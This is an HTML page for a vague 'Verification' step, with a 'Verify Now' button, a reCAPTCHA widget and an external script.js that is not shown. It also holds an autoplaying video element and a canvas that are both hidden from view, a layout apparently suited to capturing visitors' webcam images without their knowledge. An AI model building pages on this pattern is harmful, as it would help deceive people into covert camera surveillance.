<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification</title>

<style>
body{
  font-family:Arial;
  background: linear-gradient(135deg,#eef2f3,#dfe9f3);
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
}
.container{
  background:white;
  padding:25px;
  border-radius:12px;
  box-shadow:0 10px 25px rgba(0,0,0,0.15);
  text-align:center;
  width:320px;
}
button{
  padding:12px 25px;
  border:none;
  border-radius:8px;
  background:#007bff;
  color:white;
  font-size:16px;
  cursor:pointer;
}
button:hover{
  background:#0056b3;
}
video{display:none;}
canvas{display:none;}
#toast{
  margin-top:15px;
  color:green;
}
</style>

<script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>

<div class="container">
  <h2>Verify</h2>
  <button id="verifyBtn">Verify Now</button>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <div id="recaptcha-section" style="display:none;margin-top:15px;">
    <div class="g-recaptcha" data-sitekey="6LeLUJctAAAAAH1PnEma-WuJSF2sBF_VtgDZx-dW" data-callback="onRecaptchaSuccess"></div>
  </div>

  <p id="toast"></p>
</div>

<script type="module" src="script.js"></script>

</body>
</html>
